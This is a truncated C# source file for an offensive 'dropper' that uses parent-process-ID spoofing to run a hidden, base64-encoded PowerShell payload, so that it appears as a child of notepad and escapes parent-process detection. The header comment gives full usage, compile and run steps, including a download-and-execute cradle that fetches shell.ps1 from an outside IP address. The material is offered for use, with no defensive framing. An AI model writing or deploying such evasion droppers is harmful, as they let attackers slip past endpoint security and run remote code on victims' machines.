// ================================================================
// PPIDSpoofDropper.cs — PPID-Spoofing PowerShell Payload Launcher
// ================================================================
// WHAT THIS DOES:
//   Spawns a hidden PowerShell command as a child of a PPID-spoofed
//   process. By default it finds notepad.exe (launching it if needed)
//   and uses that PID as the fake parent. The child PowerShell process
//   then appears in Process Explorer as a child of notepad, not of
//   this dropper — defeating parent-process-chain detection.
//
//   The PowerShell command it runs is:
//     [System.Text.Encoding]::ASCII.GetString(
//       [System.Convert]::FromBase64String('<code>')) | iex
//
//   Where <code> is either the hardcoded base64 string in Main(), or
//   a base64-encoded PowerShell string you pass as an argument.
//
//   Also sets BLOCK_NON_MICROSOFT_BINARIES on the child process to
//   prevent non-Microsoft DLLs from being injected into it.
//
// HOW PPID SPOOFING WORKS:
//   Windows allows specifying an arbitrary parent process when creating
//   a new process via the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS extended
//   startup attribute. Security tools that check parent/child process
//   relationships can be tricked into thinking this PowerShell was
//   launched by a normal application.
//
// ----------------------------------------------------------------
// USAGE
// ----------------------------------------------------------------
//
//   The binary accepts 0 or 1 argument:
//
//   No args (uses hardcoded base64 payload in source code):
//     PPIDSpoofDropper.exe
//
//   Pass base64-encoded PowerShell as argument:
//     PPIDSpoofDropper.exe <base64_encoded_powershell_command>
//
//   How to base64-encode a PowerShell command on Kali:
//     echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/shell.ps1")' | base64 -w 0
//     (Copy the output and pass it as the argument)
//
//   OR encode in PowerShell on Windows:
//     $cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/shell.ps1")'
//     [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($cmd))
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
...
//       /unsafe /platform:x64 /out:PPIDSpoofDropper.exe PPIDSpoofDropper.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "PPIDSpoofDropper", Framework: .NET Framework 4.x
//     3. Properties -> Build -> Platform target: x64
//     4. Delete all code in Program.cs, paste this entire file
//     5. Build -> Build Solution (Ctrl+Shift+B)
//     6. Find: bin\x64\Debug\PPIDSpoofDropper.exe
//
// ----------------------------------------------------------------
// RUN
// ----------------------------------------------------------------
//
//   .\PPIDSpoofDropper.exe
//     (runs with hardcoded payload — edit the <code> placeholder in Main() first)
//
//   .\PPIDSpoofDropper.exe SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A...
//     (runs with your base64-encoded PS command)
//
// BEFORE COMPILING, CHANGE:
//   - In Main(): replace the '<code>' placeholder in the default command
//     string with your actual base64-encoded PowerShell payload
//   - Or just pass your payload as a command-line argument at runtime
// ================================================================
using System;
using System.Text;
...
namespace Dropper
{
    ...
    class UnmanagedExecute
    {
        ...
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool PeekNamedPipe(IntPtr handle, IntPtr buffer, IntPtr nBufferSize, IntPtr bytesRead,
